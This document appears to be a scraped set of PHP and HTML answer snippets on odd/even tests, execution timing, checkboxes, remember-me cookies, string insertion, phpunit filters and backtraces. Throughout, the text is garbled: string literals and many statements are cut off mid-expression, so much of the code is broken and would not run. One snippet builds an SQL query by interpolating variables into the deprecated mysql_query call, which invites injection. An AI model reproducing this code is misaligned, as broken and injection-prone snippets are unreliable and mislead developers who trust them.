$number = 13; $before = microtime(true); for ($i=0; $i<100000; $i++) { $test = ($number%2?true:false); } $after = microtime(true); echo $after-$before." seconds mod<br>"; $before = microtime(true); for ($i=0; $i<100000; $i++) { $test = (!is_int($number/2)?true:false); } $after = microtime(true); echo $after-$before." seconds is_int<br>"; $before = microtime(true); for ($i=0; $i<100000; $i++) { $test = ($number&1?true:false); } $after = microtime(true); echo $after-$before." seconds & operator<br>";
0.041879177093506 seconds mod 0.15969395637512 seconds is_int 0.044223070144653 seconds & operator
$number = 4; if(is_int($number/2)) { echo("Integer"); } else { echo("Not Integer"); }
function testEven($pArg){ if(is_int($pArg) === true){ $p = ($pArg % 2); if($p== 0){ print "The input }else{ print "The input } }else{ print "The input } } The print is there for testing purposes, hence in practice it becomes: function testEven($pArg){ if(is_int($pArg)=== true){ return $pArg%2; } return false; }
$i=0; foreach ($a as $k => $v) { $row_pos = ($i & 1) ? echo "<div id= $i++; }
$a=2; if($a %2 == 0){ echo "<h3>This Number is <b>$a</b> Even</h3>"; }else{ echo "<h3>This Number is <b>$a</b> Odd</h3>"; }
$number = 10; switch ($number%2) { case 0: echo "It break; default: echo "It }
$before = microtime(true); $n = 1000; $numbers = range(1,$n); $cube_numbers = array_map( function cube($n){ $msg = if($n%2 !=0){ $msg = } return "The Number is $n is ".$msg; } foreach($cube_numbers as $cube){ echo $cube . "<br/>"; } $after = microtime(true); echo $after-$before.
$num =14; $even = ($num % 2 == 0); $odd = ($num % 2 != 0); if($even){ echo "Number is even."; } else { echo "Number is odd."; }
<?php echo echo "<input type= echo "<button type= echo "</form>"; $num = 0; if ($_SERVER["REQUEST_METHOD"] == "POST") { if (empty($_POST["num"])) { $numErr = "<span style = echo $numErr; die(); } else { $num = $_POST["num"]; } $even = ($num % 2 == 0); $odd = ($num % 2 != 0); if ($num > 0){ if($even){ echo "Number is even."; } else { echo "Number is odd."; } } else { echo "Not a number."; } } ?>
$a = str_repeat( $a = null; var_dump($a); Outputs: NULL
<?php $start = microtime(true); for ($i = 0; $i < 10000000; $i++) { $a = $a = NULL; } $elapsed = microtime(true) - $start; echo "took $elapsed seconds\r\n"; $start = microtime(true); for ($i = 0; $i < 10000000; $i++) { $a = unset($a); } $elapsed = microtime(true) - $start; echo "took $elapsed seconds\r\n"; ?>
$a = array( $a[ echo "Key test ", array_key_exists(
$a = array( unset($a[ echo "Key test ", array_key_exists(
$a = 5; $b = &$a; unset($b); print $a; $a = 5; $b = &$a; $b = null; print $a;
for($n=0; $n<count($ids); $n++) { $product = null if( $n % 50 == 0 ) { time_nanosleep(0, 10000000); } $product = $productModel->getProductSingle((int)$ids[$n],true, true, true); ...
function gen_table_data($serv, $coorp, $type, $showSql = FALSE, $table = $sql = "SELECT COUNT(`operator`) `operator` FROM $table WHERE $serv = if($showSql === FALSE) { $sql = mysql_query($sql) or die(mysql_error()); $data = mysql_fetch_array($sql); return $data[0]; } else echo $sql; }
<?php $arr1 = array(); $arr2 = array(); for ($i = 0; $i < 10000000; $i++) { $arr1[$i] = $arr2[$i] = } $start = microtime(true); for ($i = 0; $i < 10000000; $i++) { $arr1[$i] = null; } $elapsed = microtime(true) - $start; echo $start = microtime(true); for ($i = 0; $i < 10000000; $i++) { unset($arr2[$i]); } $elapsed = microtime(true) - $start; echo
<?php $start = microtime(true); for ($i = 0; $i < 10000000; $i++) { $a = $a = NULL; } $elapsed = microtime(true) - $start; echo "took $elapsed seconds\r\n"; $start = microtime(true); for ($i = 0; $i < 10000000; $i++) { $a = unset($a); } $elapsed = microtime(true) - $start; echo "took $elapsed seconds\r\n"; ?>
<?php echo "<hr>First:<br>"; $x = str_repeat( echo memory_get_usage() . "<br>\n"; echo memory_get_peak_usage() . "<br>\n"; echo "<hr>Unset:<br>"; unset($x); $x = str_repeat( echo memory_get_usage() . "<br>\n"; echo memory_get_peak_usage() . "<br>\n"; echo "<hr>Null:<br>"; $x=null; $x = str_repeat( echo memory_get_usage() . "<br>\n"; echo memory_get_peak_usage() . "<br>\n"; echo "<hr>function:<br>"; function test() { $x = str_repeat( } echo memory_get_usage() . "<br>\n"; echo memory_get_peak_usage() . "<br>\n"; echo "<hr>Reasign:<br>"; $x = str_repeat( echo memory_get_usage() . "<br>\n"; echo memory_get_peak_usage() . "<br>\n";
First: 438296 438352 Unset: 438296 438352 Null: 438296 438352 function: 438296 438352 Reasign: 438296 520216 <-- double usage.
<input type= <input type= <input type= <input type= <input type= <input type=
document.getElementById("hd").value = document.getElementById("hs1").value+"@"+document.getElementById("hs2").value+"@"+document.getElementById("hs3").value+"@"+document.getElementById("hs4").value+"@"+document.getElementById("hs5").value
$rustart = getrusage(); function rutime($ru, $rus, $index) { return ($ru["ru_$index.tv_sec"]*1000 + intval($ru["ru_$index.tv_usec"]/1000)) - ($rus["ru_$index.tv_sec"]*1000 + intval($rus["ru_$index.tv_usec"]/1000)); } $ru = getrusage(); echo "This process used " . rutime($ru, $rustart, "utime") . " ms for its computations\n"; echo "It spent " . rutime($ru, $rustart, "stime") . " ms in system calls\n";
$time_start = microtime(true); for($i=0; $i<1000; $i++){ } $time_end = microtime(true); $execution_time = ($time_end - $time_start)/60; echo
<?php $time1 = microtime(true); $time2 = microtime(true); echo
<?php usleep(mt_rand(100, 10000)); $time = microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"]; echo "Did nothing in $time seconds\n"; ?>
class ExecutionTime { private $startTime; private $endTime; public function start(){ $this->startTime = getrusage(); } public function end(){ $this->endTime = getrusage(); } private function runTime($ru, $rus, $index) { return ($ru["ru_$index.tv_sec"]*1000 + intval($ru["ru_$index.tv_usec"]/1000)) - ($rus["ru_$index.tv_sec"]*1000 + intval($rus["ru_$index.tv_usec"]/1000)); } public function __toString(){ return "This process used " . $this->runTime($this->endTime, $this->startTime, "utime") . " ms for its computations\nIt spent " . $this->runTime($this->endTime, $this->startTime, "stime") . " ms in system calls\n"; } }
$executionTime = new ExecutionTime(); $executionTime->start(); $executionTime->end(); echo $executionTime;
<!-- put this at the top of the page --> <?php $mtime = microtime(); $mtime = explode(" ",$mtime); $mtime = $mtime[1] + $mtime[0]; $starttime = $mtime; ;?> <!-- put other code and html in here --> <!-- put this code at the bottom of the page --> <?php $mtime = microtime(); $mtime = explode(" ",$mtime); $mtime = $mtime[1] + $mtime[0]; $endtime = $mtime; $totaltime = ($endtime - $starttime); echo "This page was created in ".$totaltime." seconds"; ;?>
echo "Process took ". number_format(microtime(true) - $start, 2). " seconds.";
$tstart = 0; $tend = 0; function timer_starts() { global $tstart; $tstart=microtime(true); ; } function timer_ends() { global $tend; $tend=microtime(true); ; } function timer_calc() { global $tstart,$tend; return (round($tend - $tstart,2)); } timer_starts(); file_get_contents( timer_ends(); print(
/** * Check if more that `$miliseconds` ms remains * to error `PHP Fatal error: Maximum execution time exceeded` * * @param int $miliseconds * @return bool */ function isRemainingMaxExecutionTimeBiggerThan($miliseconds = 5000) { $max_execution_time = ini_get( if ($max_execution_time === 0) { return true; } if (strtoupper(substr(PHP_OS, 0, 3)) === $spendMiliseconds = (microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"]) * 1000; } else { $resourceUsages = getrusage(); $spendMiliseconds = $resourceUsages[ } $remainingMiliseconds = $max_execution_time * 1000 - $spendMiliseconds; return ($remainingMiliseconds >= $miliseconds); }
while (true) { if (!isRemainingMaxExecutionTimeBiggerThan(5000)) { } }
class ExecutionTime { private $startTime; private $endTime; private $compTime = 0; private $sysTime = 0; public function Start(){ $this->startTime = getrusage(); } public function End(){ $this->endTime = getrusage(); $this->compTime += $this->runTime($this->endTime, $this->startTime, "utime"); $this->systemTime += $this->runTime($this->endTime, $this->startTime, "stime"); } private function runTime($ru, $rus, $index) { return ($ru["ru_$index.tv_sec"]*1000 + intval($ru["ru_$index.tv_usec"]/1000)) - ($rus["ru_$index.tv_sec"]*1000 + intval($rus["ru_$index.tv_usec"]/1000)); } public function __toString(){ return "This process used " . $this->compTime . " ms for its computations\n" . "It spent " . $this->systemTime . " ms in system calls\n"; } }
$startTime = microtime(true); $endTime = microtime(true); $diff = round($endTime - $startTime); $minutes = floor($diff / 60); $seconds = $diff % 60; echo "script execution time: minutes:$minutes, seconds:$seconds";
$start_date = new DateTime( $since_start = $start_date->diff(new DateTime( echo $since_start->days. echo $since_start->y. echo $since_start->m. echo $since_start->d. echo $since_start->h. echo $since_start->i. echo $since_start->s.
$minutes = $since_start->days * 24 * 60; $minutes += $since_start->h * 60; $minutes += $since_start->i; echo $minutes.
$to_time = strtotime("2008-12-13 10:42:00"); $from_time = strtotime("2008-12-13 10:21:00"); echo round(abs($to_time - $from_time) / 60,2). " minute";
<?php $date1 = time(); sleep(2000); $date2 = time(); $mins = ($date2 - $date1) / 60; echo $mins; ?>
$start = date_create( $end = date_create( $diff=date_diff($end,$start); print_r($diff);
$start_date = new DateTime("2013-12-24 06:00:00",new DateTimeZone( $end_date = new DateTime("2013-12-24 06:45:00", new DateTimeZone( $interval = $start_date->diff($end_date); $hours = $interval->format( $minutes = $interval->format( echo
<?php function dateDiff($date) { $mydate= date("Y-m-d H:i:s"); $theDiff=""; $datetime1 = date_create($date); $datetime2 = date_create($mydate); $interval = date_diff($datetime1, $datetime2); $min=$interval->format( $sec=$interval->format( $hour=$interval->format( $mon=$interval->format( $day=$interval->format( $year=$interval->format( if($interval->format( { return $sec." Seconds"; } else if($interval->format( return $min." Minutes"; } else if($interval->format( return $hour." Hours"; } else if($interval->format( return $day." Days"; } else if($interval->format( return $mon." Months"; } else{ return $year." Years"; } } ?>
<?php require( $mydate= echo "The Difference between the server echo dateDiff($mydate); ?>
function calculate_time_span($date){ $seconds = strtotime(date( $months = floor($seconds / (3600*24*30)); $day = floor($seconds / (3600*24)); $hours = floor($seconds / 3600); $mins = floor(($seconds - ($hours*3600)) / 60); $secs = floor($seconds % 60); if($seconds < 60) $time = $secs." seconds ago"; else if($seconds < 60*60 ) $time = $mins." min ago"; else if($seconds < 24*60*60) $time = $hours." hours ago"; else if($seconds < 24*60*60) $time = $day." day ago"; else $time = $months." month ago"; return $time; }
function date_getFullTimeDifference( $start, $end ) { $uts[ $uts[ if( $uts[ { if( $uts[ { $diff = $uts[ if( $years=intval((floor($diff/31104000))) ) $diff = $diff % 31104000; if( $months=intval((floor($diff/2592000))) ) $diff = $diff % 2592000; if( $days=intval((floor($diff/86400))) ) $diff = $diff % 86400; if( $hours=intval((floor($diff/3600))) ) $diff = $diff % 3600; if( $minutes=intval((floor($diff/60))) ) $diff = $diff % 60; $diff = intval( $diff ); return( array( } else { echo "Ending date/time is earlier than the start date/time"; } } else { echo "Invalid date/time data detected"; } }
function DateDiffInterval($sDate1, $sDate2, $sUnit= $nInterval = strtotime($sDate2) - strtotime($sDate1); if ($sUnit== $nInterval = $nInterval/60/60/24; } else if ($sUnit== $nInterval = $nInterval/60/60; } else if ($sUnit== $nInterval = $nInterval/60; } else if ($sUnit== } return $nInterval; }
$pubDate = $row[ $diff = ago($pubDate); function ago($timestamp) { $today = new DateTime(date( $thatDay = new DateTime($timestamp); $dt = $today->diff($thatDay); if ($dt->y > 0) { $number = $dt->y; $unit = "year"; } else if ($dt->m > 0) { $number = $dt->m; $unit = "month"; } else if ($dt->d > 0) { $number = $dt->d; $unit = "day"; } else if ($dt->h > 0) { $number = $dt->h; $unit = "hour"; } else if ($dt->i > 0) { $number = $dt->i; $unit = "minute"; } else if ($dt->s > 0) { $number = $dt->s; $unit = "second"; } $unit .= $number > 1 ? "s" : ""; $ret = $number." ".$unit." "."ago"; return $ret; }
function get_time($date,$nosuffix= $datetime = new DateTime($date); $interval = date_create( if(empty($nosuffix))$suffix = ( $interval->invert ? else $suffix= if($interval->y >=1) {$count = date(VDATE, strtotime($date)); $text = elseif($interval->m >=1) {$count = date( elseif($interval->d >=1) {$count = $interval->d; $text = elseif($interval->h >=1) {$count = $interval->h; $text = elseif($interval->i >=1) {$count = $interval->i; $text = elseif($interval->s ==0) {$count = else {$count = $interval->s; $text = if(empty($text)) return return }
sudo cp /private/etc/php.ini.default /private/etc/php.ini
extension="/usr/local/Cellar/php54-mcrypt/5.4.29/mcrypt.so"
Loaded Configuration File /Applications/XAMPP/xamppfiles/etc/php.ini
<input type="hidden" name="foo" value="0" /> <input type="checkbox" name="foo" value="1">
<input type="checkbox" name="food[]" value="Orange"> <input type="checkbox" name="food[]" value="Apple">
if(isset($_POST["testvariabel"])) { echo "testvariabel has been set!"; }
$queryMU = $stmtMU = $db->prepare($queryMU); $stmtMU->execute(); if(!empty($_POST[ foreach($_POST[ try { $queryMU = $stmtMU = $db->prepare($queryMU); $stmtMU->execute(); } catch(PDOException $e) { $msg = } }
<input type="checkbox" value="menu_news" name="check_menus[]" /> <input type="checkbox" value="menu_gallery" name="check_menus[]" />
<input name="status" type="checkbox" value="1" checked>
<input name="status" type="checkbox" value="1" <?php if ($row[
$status = $_POST[ if ($status == 1) { $status = 1; } else { $status = 0; }
<?php $checked = ($_POST[ ?> <input type="checkbox" name="foo" value=" checked"<?=$_POST[
<?php if (isset($_POST[ $nama = $_POST[ $subscribe = isset($_POST[ echo "Name: {$nama} <br />"; echo "Subscribe: {$subscribe}"; echo "<hr />"; } ?> <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="POST" > <input type="text" name="name" /> <br /> <input type="checkbox" name="subscribe" value="news" /> News <br /> <input type="submit" name="add" value="Save" /> </form>
<?php $checked="hola"; $exenta = $datosOrdenCompra[0][ var_dump($datosOrdenCompra[0][ if(isset($datosOrdenCompra[0][ $checked="on"; }else{ $checked="off"; } ?> <input type="checkbox" id="exenta" name="exenta" <?php echo $checked;?> > <span class="label-text"> Exenta</span>
<?php if(isset($_POST[ $_SESSION[ } ?> <input type="checkbox" name="nameCheckbox" <?php if(isset($_SESSION[ echo unset($_SESSION[ } ?>
guesses_per_second = servers * guesses guesses_per_second = 50,000,000 * 1,000,000,000 guesses_per_second = 50,000,000,000,000,000
time_to_guess = possibilities / guesses_per_second time_to_guess = 3.4e38 / 50,000,000,000,000,000 time_to_guess = 6,800,000,000,000,000,000,000
function onLogin($user) { $token = GenerateRandomToken(); storeTokenForUser($user, $token); $cookie = $user . $mac = hash_hmac( $cookie .= setcookie( }
function rememberMe() { $cookie = isset($_COOKIE[ if ($cookie) { list ($user, $token, $mac) = explode( if (!hash_equals(hash_hmac( return false; } $usertoken = fetchTokenByUserName($user); if (hash_equals($usertoken, $token)) { logUserIn($user); } } }
/** * A timing safe equals comparison * * To prevent leaking length information, it is important * that user input is always used as the second parameter. * * @param string $safe The internal (safe) value to be checked * @param string $user The user submitted (unsafe) value * * @return boolean True if the two strings are identical. */ function timingSafeCompare($safe, $user) { if (function_exists( return hash_equals($safe, $user); } $safe .= chr(0); $user .= chr(0); if (function_exists( $safeLen = mb_strlen($safe, $userLen = mb_strlen($user, } else { $safeLen = strlen($safe); $userLen = strlen($user); } $result = $safeLen - $userLen; for ($i = 0; $i < $userLen; $i++) { $result |= (ord($safe[$i % $safeLen]) ^ ord($user[$i])); } return $result === 0; }
$key = $key = pack("H*", $key); $db = new Memcache(); $db->addserver("127.0.0.1"); try { $rememberMe = new RememberMe($key); $rememberMe->setDB($db); if ($data = $rememberMe->auth()) { printf("Returning User %s\n", $data[ } else { $user = "baba"; $rememberMe->remember($user); printf("New Account %s\n", $user); } } catch (Exception $e) { printf(" }
class RememberMe { private $key = null; private $db; function __construct($privatekey) { $this->key = $privatekey; } public function setDB($db) { $this->db = $db; } public function auth() { if (! isset($_COOKIE["auto"]) || empty($_COOKIE["auto"])) { return false; } if (! $cookie = @json_decode($_COOKIE["auto"], true)) { return false; } if (! (isset($cookie[ return false; } $var = $cookie[ if (! $this->verify($var, $cookie[ throw new Exception("Cokies has been tampared with"); } $info = $this->db->get($cookie[ if (! $info) { return false; } if (! $info = json_decode($info, true)) { throw new Exception("User Data corrupted"); } if ($info[ throw new Exception("System Hijacked or User use another browser"); } /** * Important * To make sure the cookie is always change * reset the Token information */ $this->remember($info[ return $info; } public function remember($user) { $cookie = [ "user" => $user, "token" => $this->getRand(64), "signature" => null ]; $cookie[ $encoded = json_encode($cookie); $this->db->set($user, $encoded); /** * Set Cookies * In production enviroment Use * setcookie("auto", $encoded, time() + $expiration, "/~root/", * "example.com", 1, 1); */ setcookie("auto", $encoded); } public function verify($data, $hash) { $rand = substr($hash, 0, 4); return $this->hash($data, $rand) === $hash; } private function hash($value, $rand = null) { $rand = $rand === null ? $this->getRand(4) : $rand; return $rand . bin2hex(hash_hmac( } private function getRand($length) { switch (true) { case function_exists("mcrypt_create_iv") : $r = mcrypt_create_iv($length, MCRYPT_DEV_URANDOM); break; case function_exists("openssl_random_pseudo_bytes") : $r = openssl_random_pseudo_bytes($length); break; case is_readable( $r = file_get_contents( break; default : $i = 0; $r = ""; while($i ++ < $length) { $r .= chr(mt_rand(0, 255)); } break; } return substr(bin2hex($r), 0, $length); } }
TABLE users: UID - auto increment, PK username - varchar(255), unique, indexed, NOT NULL password_hash - varchar(255), NOT NULL ...
TABLE sessions: session_id - varchar(?), PK session_token - varchar(?), NOT NULL session_data - MediumText, NOT NULL
TABLE autologin: UID - auto increment, PK username - varchar(255), NOT NULL, allow duplicates hostname - varchar(255), NOT NULL, allow duplicates mac_address - char(23), NOT NULL, unique token - varchar(?), NOT NULL, allow duplicates expires - datetime code
$data = (SALT + ":" + hash(User Agent) + ":" + username + ":" + LoginTimestamp + ":"+ SALT)
$newstr = substr_replace($oldstr, $str_to_insert, $pos, 0);
$str = substr($oldstr, 0, $pos) . $str_to_insert . substr($oldstr, $pos);
<?php $string = $substr = $attachment = $newstring = str_replace($substr, $substr.$attachment, $string); ?>
function stringInsert($str,$insertstr,$pos) { $str = substr($str, 0, $pos) . $insertstr . substr($str, $pos); return $str; }
str_replace($sub_str, $insert_str.$sub_str, $org_str);
function putinplace($string=NULL, $put=NULL, $position=false) { $d1=$d2=$i=false; $d=array(strlen($string), strlen($put)); if($position > $d[0]) $position=$d[0]; for($i=$d[0]; $i >= $position; $i--) $string[$i+$d[1]]=$string[$i]; for($i=0; $i<$d[1]; $i++) $string[$position+$i]=$put[$i]; return $string; } $string= $put=" $position=10; print_r( putinplace($string, $put, $position) );
$oldstring = "This is a test\n function insert ($string, $keyword, $body) { return substr_replace($string, PHP_EOL . $body, strpos($string, $keyword) + strlen($keyword), 0); } echo insert($oldstring, "
This is a test Insert this awesome string below findme!!! Other text and data.
function stringInsert($str, $pos, $insertstr) { if (!is_array($pos)) { $pos = array($pos); } else { asort($pos); } $insertionLength = strlen($insertstr); $offset = 0; foreach ($pos as $p) { $str = substr($str, 0, $p + $offset) . $insertstr . substr($str, $p + $offset); $offset += $insertionLength; } return $str; }
function stringInsert($str,$insertstr,$pos) { $count_str=strlen($str); for($i=0;$i<$pos;$i++) { $new_str .= $str[$i]; } $new_str .="$insertstr"; for($i=$pos;$i<$count_str;$i++) { $new_str .= $str[$i]; } return $new_str; }
function insSubstr($str, $sub, $posStart, $posEnd){ return mb_substr($str, 0, $posStart) . $sub . mb_substr($str, $posEnd + 1); }
[PDOException] SQLSTATE[HY000] [2002] No such file or directory
[PDOException] SQLSTATE[HY000] [2002] No such file or directory
pdo_mysql.default_socket => /tmp/mysql.sock => /tmp/mysql.sock
pdo_mysql.default_socket=/var/run/mysqld/mysqld.sock
pdo_mysql.default_socket => /var/run/mysqld/mysqld.sock => /var/run/mysqld/mysqld.sock
mkdir /var/mysql ln -s /tmp/mysql.sock /var/mysql/mysql.sock
unix 2 [ ACC ] STREAM LISTENING 17397 /var/run/mysqld/mysqld.sock
DB_HOST=127.0.0.1 DB_DATABASE=db1 DB_USERNAME=user1 DB_PASSWORD=pass1
vm vagrant@homestead:~/Code/projectFolder php artisan migrate:install
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"> <?php if($siteLink_val) echo $siteLink_val; ?> </textarea>
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"><?php if($siteLink_val) echo $siteLink_val; ?></textarea>
<textarea>something here with no spaces in the begining</textarea>
<textarea id="sitelink" name="sitelink"> </textarea>
<textarea id="sitelink" name="sitelink"></textarea>
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"><?php if($siteLink_val) echo $siteLink_val; ?></textarea>
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"><?php if($siteLink_val) echo trim($siteLink_val);?></textarea>
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink" ><?php if($siteLink_val) echo $siteLink_val; ?></textarea>
$( { $( $(this).val($(this).val().trim()); } ); });
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"> <?php if($siteLink_val) echo trim($siteLink_val); ?> </textarea>
function build_siteLink_val() { if ( $siteLink_val ) { return $siteLink_val; } else { return ""; } } $output_siteLink_val = build_siteLink_val();
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"><?=$output_siteLink_val?></textarea>
<textarea> for line in lines: echo line.replace( endfor </textarea>
<textarea style="width:350px; height:80px;" cols="42" rows="5" name="sitelink"><?php if($siteLink_val) echo $siteLink_val; ?></textarea>
include __DIR__ . DIRECTORY_SEPARATOR . echoScriptPath(); function echoScriptPath() { list($scriptPath) = get_included_files(); echo }
C:\>php C:\Users\Redacted\Desktop\main.php The script being executed is C:\Users\Redacted\Desktop\main.php
$stack = debug_backtrace(); $firstFrame = $stack[count($stack) - 1]; $initialFile = $firstFrame[
$_SERVER["DOCUMENT_ROOT"] 🡺 /home/user/public_html $_SERVER["SERVER_ADDR"] 🡺 143.34.112.23 $_SERVER["SERVER_PORT"] 🡺 80(or 443 etc..) $_SERVER["REQUEST_SCHEME"] 🡺 https $_SERVER[ $_SERVER["REQUEST_URI"] 🡺 /subFolder/yourfile.php?var=blabla $_SERVER["QUERY_STRING"] 🡺 var=blabla __FILE__ 🡺 /home/user/public_html/subFolder/yourfile.php __DIR__ 🡺 /home/user/public_html/subFolder $_SERVER["REQUEST_URI"] 🡺 /subFolder/yourfile.php?var=blabla parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH)🡺 /subFolder/yourfile.php $_SERVER["PHP_SELF"] 🡺 /subFolder/yourfile.php $_SERVER["SCRIPT_FILENAME"]🡺 /home/user/public_html/parentfile.php $_SERVER["PHP_SELF"] 🡺 /parentfile.php $_SERVER["REQUEST_URI"] 🡺 /parentfile.php?abc __FILE__ 🡺 /home/user/public_html/subFolder/yourfile.php $x = parse_url($url); $x[ $x[ $x[ $x[ $x[ A = pathinfo($url); B = pathinfo(parse_url($url)[ A[ B[ A[ B[ A[ B[ A[ B[ $HTTP_or_HTTPS = ((!empty($_SERVER[ basename($url) 🡺 yourfile.php $debug_files = debug_backtrace(); $initial_called_file = count($debug_files) ? $debug_files[count($debug_files) - 1][
home_url() 🡺 http: get_stylesheet_directory_uri() 🡺 http: get_stylesheet_directory() 🡺 /home/user/public_html/wpdir/wp-content/themes/THEME_NAME plugin_dir_url(__FILE__) 🡺 http: plugin_dir_path(__FILE__) 🡺 /home/user/public_html/wpdir/wp-content/plugins/PLUGIN_NAME/
/** * Get the file path/dir from which a script/function was initially executed * * @param bool $include_filename include/exclude filename in the return string * @return string */ function get_function_origin_path($include_filename = true) { $bt = debug_backtrace(); array_shift($bt); if ( array_key_exists(0, $bt) && array_key_exists( $file_path = $bt[0][ if ( $include_filename === false ) { $file_path = str_replace(basename($file_path), } } else { $file_path = null; } return $file_path; }
if(substr($_SERVER[ $script = realpath($_SERVER[ } else { $script = realpath(getcwd() . DIRECTORY_SEPARATOR . $_SERVER[ }
phpunit EscalationGroupTest escalation/EscalationGroupTest.php --filter=escalation/EscalationGroupTest.php::testSaveAndDrop phpunit EscalationGroupTest escalation/EscalationGroupTest.php --filter=EscalationGroupTest.php::testSaveAndDrop phpunit EscalationGroupTest escalation/EscalationGroupTest.php --filter=EscalationGroupTest::testSaveAndDrop phpunit EscalationGroupTest escalation/EscalationGroupTest.php --filter=testSaveAndDrop
phpunit --filter testSaveAndDrop EscalationGroupTest escalation/EscalationGroupTest.php phpunit --filter methodName ClassName path/to/file.php
/** * @group failing * Tests the api edit form */ public function testEditAction()
/** * @group failing * @group bug2204 */ public function testSomethingElse() { }
phpunit --filter testSaveAndDrop reference/to/escalation/EscalationGroupTest.php
vendor/bin/phpunit tests/Feature/{testfilename} vendor/bin/phpunit tests/Unit/{testfilename}
vendor/bin/phpunit tests/Feature/ContactpageTest.php vendor/bin/phpunit tests/Unit/ContactpageTest.php
Usage: phpunit [options] UnitTest [UnitTest.php] phpunit [options] <directory>
vendor/bin/phpunit --filter methodName className pathTofile.php vendor/bin/phpunit --filter
vendor/bin/phpunit --filter tests/Feature/UserTest.php vendor/bin/phpunit --filter vendor/bin/phpunit --filter
vendor/bin/phpunit --filter testExample vendor/bin/phpunit --filter vendor/bin/phpunit --filter testExample UserTest tests/Feature/UserTest.php
<groups> <include> <group>nameToInclude</group> </include> <exclude> <group>nameToExclude</group> </exclude> </groups>
<?php require_once(dirname(__FILE__) . $wp->init(); $wp->parse_request(); $wp->query_posts(); $wp->register_globals(); $wp->send_headers(); echo site_url(); ?>
<?php require_once(dirname(__FILE__) . header("HTTP/1.1 200 OK"); header("Status: 200 All rosy"); echo site_url(); ?>
<?php require( dirname( __FILE__ ) . $uri = $_SERVER[ $pieces = explode("?", $uri); $post_id = intval( $pieces[1] ); $title = get_the_title($post_id); $post = get_post($post_id); $descr = $post->post_excerpt; $img_data_array = get_attached_media( $img_src = null; $img_count = 0; foreach ( $img_data_array as $img_data ) { if ( $img_count > 0 ) { break; } else { ++$img_count; $img_src = $img_data->guid; } } ?> <!DOCTYPE HTML> <html> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, user-scalable=yes" /> <meta property="og:title" content="<?php echo $title; ?>" /> <meta property="og:description" content="<?php echo $descr; ?>" /> <meta property="og:locale" content="en_US" /> <meta property="og:type" content="website" /> <meta property="og:url" content="<?php echo site_url(). <meta property="og:image" content="<?php echo $img_src; ?>" /> <meta property="og:site_name" content="Your Title" /> </html>
/** * The template for displaying demo page * * template name: demo template * */
require_once(dirname(__FILE__) . $wp->init(); $wp->parse_request(); $wp->query_posts(); $wp->register_globals(); $wp->send_headers(); echo site_url();
<?php /* * Template Name: Custom Template * Custom template used for custom php code display * @package Portafolio WordPress Theme * @author Gufran Hasan * @copyright Copyright templatecustom.com * @link http: */ ?> <?php get_header(); ?> <?php ?> <?php get_footer(); ?>
<?php ?> <?php get_header(); ?> <div id="primary" class="content-area"> <main id="main" class="site-main" role="main"> <?php while ( have_posts() ) : the_post(); get_template_part( if ( comments_open() || get_comments_number() ) { comments_template(); } endwhile; ?> </main><!-- .site-main --> <?php get_sidebar( </div><!-- .content-area --> <?php get_sidebar(); ?> <?php get_footer(); ?>
<?php $error = array(); $error[ $error[ if (!empty($error)) { echo } else { echo } ?>
$errors = array_filter($errors); if (!empty($errors)) { }
"" (an empty string) 0 (0 as an integer) 0.0 (0 as a float) "0" (0 as a string) NULL FALSE array() (an empty array) var $var; (a variable declared, but without a value in a class)
$a=array("",""); if(empty($a)) echo "empty"; else echo "not empty";
function is_array_empty($a){ foreach($a as $elm) if(!empty($elm)) return false; return true; }
<?php if($error!=null) echo "array is blank or null or not array"; if(!empty($error)) echo "array is blank or null or not array"; if(is_array($error)) echo "array is blank or null or not array"; ?>
<?php if(empty($myarray)) echo"true"; else echo "false"; ?>
function functionallyEmpty($o) { if (empty($o)) return true; else if (is_numeric($o)) return false; else if (is_string($o)) return !strlen(trim($o)); else if (is_object($o)) return functionallyEmpty((array)$o); foreach($o as $element) if (functionallyEmpty($element)) continue; else return false; return true; }
$subject = array( empty($subject); functionallyEmpty($subject); class $Subject { a => b => array() } $theSubject = new Subject(); empty($theSubject); functionallyEmpty($theSubject);
php > $error = array(); php > $error[ php > $error[ php > var_dump(empty($error)); bool(false) php > $error = array(); php > var_dump(empty($error)); bool(true) php >
array(2) { [0]=> array(4) { ["file"] => string(10) "/tmp/a.php" ["line"] => int(10) ["function"] => string(6) "a_test" ["args"]=> array(1) { [0] => &string(6) "friend" } } [1]=> array(4) { ["file"] => string(10) "/tmp/b.php" ["line"] => int(2) ["args"] => array(1) { [0] => string(10) "/tmp/a.php" } ["function"] => string(12) "include_once" } }
$e = new \Exception; var_dump($e->getTraceAsString());
$e = new Exception; error_log(var_export($e->getTraceAsString(), true));
class debugUtils { public static function callStack($stacktrace) { print str_repeat("=", 50) ."\n"; $i = 1; foreach($stacktrace as $node) { print "$i. ".basename($node[ $i++; } } }
================================================== 1. DatabaseDriver.php::getSequenceTable(169) 2. ClassMetadataFactory.php::loadMetadataForClass(284) 3. ClassMetadataFactory.php::loadMetadata(177) 4. ClassMetadataFactory.php::getMetadataFor(124) 5. Import.php::getAllMetadata(188) 6. Command.php::execute(187) 7. Application.php::run(194) 8. Application.php::doRun(118) 9. doctrine.php::run(99) 10. doctrine::include(4) ==================================================
debug_print_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS);
function debug_backtrace_string() { $stack = $i = 1; $trace = debug_backtrace(); unset($trace[0]); foreach($trace as $node) { $stack .= " if(isset($node[ $stack .= $node[ } $stack .= $node[ $i++; } return $stack; }
$ ./phptrace -p 3130 -s phptrace 0.2.0 release candidate, published by infra webcore team process id = 3130 script_filename = /home/xxx/opt/nginx/webapp/block.php [0x7f27b9a99dc8] sleep /home/xxx/opt/nginx/webapp/block.php:6 [0x7f27b9a99d08] say /home/xxx/opt/nginx/webapp/block.php:3 [0x7f27b9a99c50] run /home/xxx/opt/nginx/webapp/block.php:10
<pre> <?php debug_print_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS); ?> </pre>
